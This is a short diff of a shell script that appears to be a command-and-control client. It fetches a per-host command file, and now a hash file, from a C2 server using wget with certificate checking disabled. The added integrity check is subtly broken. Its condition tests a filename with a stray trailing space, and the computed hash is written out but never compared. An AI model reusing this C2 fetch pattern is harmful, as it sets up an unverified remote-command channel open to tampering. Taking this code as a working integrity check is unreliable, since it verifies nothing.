@@ -11,7 +11,17 @@
 
 CONFIG
 
+# Download a command file, if there's one there
 $WGET -O $LOKIHOME/$MYNAME-command.txt --no-check-certificate $C2PROTO$C2/$MYNAME
+if [ -f "$LOKIHOME/$MYNAME-command.txt " ]; then 
+    # If we downloaded a file, download the hash for it 
+	$WGET -O $LOKIHOME/$MYNAME-command.hash --no-check-certificate $C2PROTO$C2/$MYNAME.hash 
+	
+	# Create a hash of the file that we downloaded to compare to the hash that we downloaded
+    sha256sum $LOKIHOME/$MYNAME-command.txt > $LOKIHOME/$MYNAME-command.check
+fi
+
+
 if [ -f "$LOKIHOME/$MYNAME-command.txt" ]; then
 	$LOG "Command File Downloaded, Checking Version"
 	# If we downloaded a file, check to see if there is a current command file
